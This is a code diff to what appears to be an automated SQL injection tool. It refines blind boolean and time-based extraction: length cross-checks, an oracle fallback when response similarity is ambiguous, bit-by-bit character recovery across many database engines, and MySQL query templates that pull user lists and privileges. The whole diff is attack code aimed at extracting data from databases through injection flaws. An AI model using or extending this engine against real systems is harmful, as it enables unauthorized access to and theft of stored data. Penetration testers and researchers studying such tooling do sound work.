@@ -56606,14 +56606,19 @@ class Scanner:
                     # length=N-1 False, length=N+1 False.  A spurious True fails at least one
                     # of these cross-checks.  Skip length=0 cross-check (can't do -1).
                     _confirmed = True
+                    _r_prev = None
                     if _try_len > 0:
                         _r_prev = await _cached_eval(f"{_len_fn}={_try_len - 1}")
                         if _r_prev is True:
                             _confirmed = False  # oracle returned True for N-1 too — unreliable
+                    _r_next = None
                     if _confirmed and _try_len < max_len:
                         _r_next = await _cached_eval(f"{_len_fn}={_try_len + 1}")
                         if _r_next is True:
                             _confirmed = False  # oracle returned True for N+1 too — unreliable
+                    # Both neighbors returned None: oracle too noisy — don't trust this True
+                    if _confirmed and _try_len > 0 and _r_prev is None and _r_next is None:
+                        _confirmed = False
                     if _confirmed:
                         return _try_len
                     # Cross-check failed: skip this length and keep searching
@@ -56903,14 +56908,19 @@ class Scanner:
                     # Accept the first True only after cross-checking neighbours.
                     # A genuine length=N satisfies: N-1 is False, N+1 is False.
                     _sub_confirmed = True
+                    _r_sub_prev = None
                     if _try_len > 0:
                         _r_sub_prev = await _cached_eval(f"{_len_fn}-{_try_len - 1}=0")
                         if _r_sub_prev is True:
                             _sub_confirmed = False
+                    _r_sub_next = None
                     if _sub_confirmed and _try_len < max_len:
                         _r_sub_next = await _cached_eval(f"{_len_fn}-{_try_len + 1}=0")
                         if _r_sub_next is True:
                             _sub_confirmed = False
+                    # Both neighbors returned None: oracle too noisy — don't trust this True
+                    if _sub_confirmed and _try_len > 0 and _r_sub_prev is None and _r_sub_next is None:
+                        _sub_confirmed = False
                     if _sub_confirmed:
                         _length = _try_len
                         break
@@ -57039,9 +57049,9 @@ class Scanner:
                     # to True/False; return None (ambiguous) when the gap is too small so the
                     # caller retries or skips the probe, preventing garbage accumulation.
                     _sim_gap = _sim_t - _sim_f
-                    if abs(_sim_gap) < 0.05:
-                        return None  # too close to call — don't commit to either side
-                    return _sim_gap > 0
+                    if abs(_sim_gap) >= 0.05:
+                        return _sim_gap > 0
+                    # SimHash gap < 0.05 — ambiguous; fall through to body-length oracle below
                 # Status code comparison
                 if _bool_true_status is not None and _s is not None:
                     return _s == _bool_true_status
@@ -81879,7 +81889,8 @@ class BitwiseExtractor:
             # and the fallback never fires — the wrong character is returned silently.
             # Fix: for MSSQL/Sybase/SQLite, if char_code ≥ 128, delegate to _binary_search_fallback
             # which searches over the full [0, 65535] range and returns the correct code point.
-            if dbms in ("MSSQL", "Sybase", "SQLite") and char_code >= 128:
+            if dbms in ("MSSQL", "Sybase", "SQLite", "MySQL", "MariaDB", "PostgreSQL",
+                        "Oracle", "TiDB", "CockroachDB", "YugabyteDB", "Amazon Redshift") and char_code >= 128:
                 self._fallback_count += 1
                 return await self._binary_search_fallback(char_func, dbms)
             return chr(char_code)
@@ -91331,7 +91342,7 @@ class ZKBooleanExtractor:
         # Threshold per bit: > base + sleep*0.55
         threshold = base_t + sleep_ms * 0.55
         # Filter BaseException items (CancelledError etc.) before comparison
-        bits = [1 if (not isinstance(t, BaseException) and t >= threshold) else 0
+        bits = [1 if (not isinstance(t, BaseException) and t is not None and t >= threshold) else 0
                 for t in bit_times]
         char_code = sum(bits[b] * (2 ** b) for b in range(self.BITS))
         # BUG-ZKE-BITWISE-DBMS-BITS FIX: _zk_bit_hi guard must match the actual char-function
@@ -137858,9 +137869,9 @@ DBMS_QUERIES_EXTENSION: Dict[str, Dict[str, str]] = {
         "count":        "SELECT COUNT(*) FROM `{db}`.`{table}`",
         "row":          "SELECT CONCAT_WS('|',{cols}) FROM `{db}`.`{table}` LIMIT 1 OFFSET {offset}",
         "users":        "SELECT GROUP_CONCAT(User ORDER BY User SEPARATOR ',') FROM mysql.user",
-        "char_func":    "ORD(MID(({query}),{pos},1))",
+        "char_func":    "COALESCE(ORD(MID(({query}),{pos},1)),0)",
         "substr":       "MID(({query}),{pos},1)",
-        "len_func":     "LENGTH(({query}))",
+        "len_func":     "CHAR_LENGTH(({query}))",
         "if_func":      "IF(({cond}),{t},{f})",
         "privileges":   "SELECT GROUP_CONCAT(DISTINCT PRIVILEGE_TYPE SEPARATOR ',') FROM INFORMATION_SCHEMA.USER_PRIVILEGES",
     },
